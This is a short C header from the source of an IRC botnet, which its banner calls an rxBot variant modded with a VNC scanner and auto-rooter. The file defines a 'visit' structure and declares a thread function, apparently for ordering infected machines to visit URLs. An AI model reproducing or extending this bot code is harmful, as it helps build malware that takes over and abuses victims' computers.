/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#ifndef NO_VISIT
// visit structure
typedef struct VISIT
{
	 SOCKET sock;
	 char host[MAXHOSTNAME];
	 char referer[MAXURLLEN];
	 char chan[MAXCHANLEN];
	 int threadnum;
	 BOOL silent;
	 BOOL notice;
	 BOOL gotinfo;

} VISIT;

DWORD WINAPI VisitThread(LPVOID param);
#endif
